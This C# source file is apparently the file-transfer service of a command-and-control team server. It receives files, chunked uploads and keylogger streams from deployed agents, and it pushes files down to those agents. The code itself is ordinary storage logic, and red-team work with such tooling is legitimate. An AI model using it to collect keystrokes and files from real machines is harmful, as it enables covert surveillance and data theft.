using TeamServer.Interface;
using TeamServer.Repositories;
using System.Text.Json;
using Trinity.Shared.DTOs.Command;
using Trinity.Shared.DTOs.Notification;
using Trinity.Shared.Enums;
using Trinity.Shared.Enums.Tasks;
using Trinity.Shared.Interfaces;

namespace TeamServer.Services;

public sealed class FileTransferService : IFileTransferService
{
    // Absolute root folder used for received files, chunks, and streams.
    private readonly string _storageRoot;
    private readonly AgentRepository _agentRepository;
    private readonly INotificationHub _notificationHub;

    public FileTransferService(IConfiguration configuration,
        IWebHostEnvironment environment, AgentRepository agentRepository, INotificationHub notificationHub)
    {
        _agentRepository = agentRepository;
        _notificationHub = notificationHub;

        // Read StoragePath from configuration.
        // If it is missing, store data in a storage folder beside the application.
        _storageRoot = Path.GetFullPath(configuration["StoragePath"] ?? Path.Combine(environment.ContentRootPath, "storage"));

        // Create the normal-file directory when the service starts.
        Directory.CreateDirectory(Path.Combine(_storageRoot, "files"));

        // Create the continuous-stream directory when the service starts.
        Directory.CreateDirectory(Path.Combine(_storageRoot, "streams"));
    }

    public async Task ReceiveFileAsync(string agentKey, string fileName, Stream data, CancellationToken cancellationToken = default)
    {
        var campaignId = await GetCampaignIdAsync(agentKey);
        await CopyToFileAsync(CampaignFilePath(campaignId, fileName), data, cancellationToken);

        // Event log: an upload finished, which is otherwise invisible until someone opens the file list.
        await _notificationHub.SendEventLogAsync(
            campaignId.ToString(),
            new EventLog(DateTime.UtcNow, EventLogType.AGENT, $"File '{fileName}' received from agent '{agentKey}'"));
    }

    public async Task ReceiveChunkAsync(string agentKey, string transferId, int chunkNumber, Stream data, CancellationToken cancellationToken = default)
    {
        // A negative number is invalid and would not represent a real chunk.
        if (chunkNumber < 0)
            throw new ArgumentOutOfRangeException(nameof(chunkNumber));

        var campaignId = await GetCampaignIdAsync(agentKey);
        var directory = TransferDirectory(campaignId, transferId);

        // Zero padding ensures chunk_00000002 sorts after chunk_00000001.
        await CopyToFileAsync(Path.Combine(directory, $"chunk_{chunkNumber:D8}"), data, cancellationToken);
    }

    public async Task<string> RebuildFileAsync(string agentKey, string transferId, CancellationToken cancellationToken = default)
    {
        // Locate the directory containing this transfer's chunks.
        var campaignId = await GetCampaignIdAsync(agentKey);
        var directory = TransferDirectory(campaignId, transferId);

        // Rebuilding cannot work if the directory does not exist.
        if (!Directory.Exists(directory))
            throw new DirectoryNotFoundException("Transfer directory was not found.");

        // Find only chunk files and sort them into their original order.
        var chunks = Directory.EnumerateFiles(directory, "chunk_*").OrderBy(path => path, StringComparer.Ordinal).ToArray();

        // An empty directory indicates that no data was received.
        if (chunks.Length == 0)
            throw new InvalidOperationException("No chunks were found.");

        // Store the rebuilt result beside other received files.
        var outputPath = Path.Combine(_storageRoot, "files", SafeName(campaignId.ToString()),
            $"{SafeName(transferId)}_rebuilt");

        // Create the destination in binary mode.
        await using var output = File.Create(outputPath);
        foreach (var chunk in chunks)
        {
            // Open one chunk at a time to avoid loading the entire transfer in memory.
            await using var input = File.OpenRead(chunk);

            // Copy bytes unchanged so JPG, ZIP, PDF, and other binary files work.
            await input.CopyToAsync(output, cancellationToken);
        }

        // Event log: a chunked transfer is complete and reassembled.
        await _notificationHub.SendEventLogAsync(
            campaignId.ToString(),
            new EventLog(DateTime.UtcNow, EventLogType.AGENT,
                $"Transfer '{transferId}' reassembled from {chunks.Length} chunk(s)"));

        return outputPath;
    }

    public async Task ReceiveStreamDataAsync(string agentKey, string streamId, Stream data, CancellationToken cancellationToken = default)
    {
        var campaignId = await GetCampaignIdAsync(agentKey);
        await CopyToFileAsync(Path.Combine(_storageRoot, "streams", SafeName(campaignId.ToString()),
            $"{SafeName(streamId)}.txt"), data, cancellationToken, FileMode.Append);

        // Event log: a continuous stream (the keylogger's harvest) delivered another piece.
        await _notificationHub.SendEventLogAsync(
            campaignId.ToString(),
            new EventLog(DateTime.UtcNow, EventLogType.AGENT, $"Stream '{streamId}' received data from agent '{agentKey}'"));
    }

    public async Task<JsonDocument> PrepareDownloadChunkAsync(Trinity.Shared.Models.Task task, string agentKey, CancellationToken cancellationToken = default)
    {
        var command = task.Command.RootElement;

        // Path is the destination on the agent (C:\Users\...\file.txt); storage is keyed by the
        // file name only. Using the raw path makes every lookup miss.
        var requestedPath = command.GetProperty("Path").GetString()
            ?? throw new InvalidOperationException("Download path is required.");
        var fileName = ExtractFileName(requestedPath);
        var transferId = command.TryGetProperty("TransferID", out var transferElement)
            ? transferElement.GetString()
            : null;
        var campaignId = await GetCampaignIdAsync(agentKey);
        var path = CampaignFilePath(campaignId, fileName);
        if (!File.Exists(path))
            throw new FileNotFoundException("The requested file was not found.", fileName);

        var offset = command.TryGetProperty("Offset", out var offsetElement) ? offsetElement.GetInt64() : 0;
        const int chunkSize = 512 * 1024;
        await using var input = File.OpenRead(path);
        if (offset < 0 || offset > input.Length)
            throw new InvalidOperationException("The transfer offset is invalid.");

        input.Position = offset;
        var buffer = new byte[(int)Math.Min(chunkSize, input.Length - offset)];
        var count = await input.ReadAsync(buffer.AsMemory(), cancellationToken);
        var final = offset + count >= input.Length;
        task.Command = JsonDocument.Parse(JsonSerializer.Serialize(new DownloadChunkState(
            requestedPath,
            // Keep TransferID: the agent builds its download URL from it (campaign id), and the
            // rewrite otherwise drops the field, making the agent refuse the task.
            transferId,
            offset + count,
            input.Length,
            final)));
        task.Status = Status.QUEUED;

        // This document becomes the task's Command on the wire (commandOverride), so it must carry
        // the same fields the agent needs: the full destination path and the TransferID it derives
        // the campaign id from. Sending only the file name leaves the agent with an empty campaign.
        return JsonDocument.Parse(JsonSerializer.Serialize(new DownloadChunkPayload(
            requestedPath,
            transferId,
            Convert.ToBase64String(buffer, 0, count),
            offset,
            input.Length,
            final)));
    }

    private string TransferDirectory(int campaignId, string transferId)
    {
        // Use a separate directory for every transfer.
        var directory = Path.Combine(_storageRoot, "files", SafeName(campaignId.ToString()), SafeName(transferId));

        // Create the directory before the caller writes a chunk.
        Directory.CreateDirectory(directory);
        return directory;
    }

    private string CampaignFilePath(int campaignId, string fileName) =>
        Path.Combine(_storageRoot, "files", SafeName(campaignId.ToString()), SafeName(fileName));

    private async Task<int> GetCampaignIdAsync(string agentKey)
    {
        var agent = await _agentRepository.GetAgentByCheckInUUID(agentKey);
        if (agent is null)
            throw new KeyNotFoundException($"Agent '{agentKey}' was not found.");
        return agent.CampaignID;
    }

    private static async Task CopyToFileAsync(string path, Stream data, CancellationToken cancellationToken, FileMode mode = FileMode.Create)
    {
        // Ensure the target directory exists before opening the file.
        Directory.CreateDirectory(Path.GetDirectoryName(path)!);

        // FileMode.Create replaces an existing file; Append adds to the end.
        await using var output = new FileStream(path, mode, FileAccess.Write, FileShare.Read);

        // Stream.CopyToAsync transfers bytes without loading the complete body.
        await data.CopyToAsync(output, cancellationToken);
    }

    /// <summary>
    /// Returns the last path component of a path that may use Windows or POSIX separators.
    /// The server runs on Linux, where Path.GetFileName does not split on a backslash.
    /// </summary>
    private static string ExtractFileName(string path)
    {
        int cut = path.LastIndexOfAny(new[] { '\\', '/' });
        return cut >= 0 ? path[(cut + 1)..] : path;
    }

    private static string SafeName(string name)
    {
        // Decode URL characters and keep only the final filename component.
        // This blocks values such as ../../secret.txt from escaping storage.
        var safeName = Path.GetFileName(Uri.UnescapeDataString(name));

        // Reject empty, current-directory, and parent-directory names.
        if (string.IsNullOrWhiteSpace(safeName) || safeName is "." or "..")
            throw new ArgumentException("A safe, non-empty name is required.", nameof(name));
        return safeName;
    }
}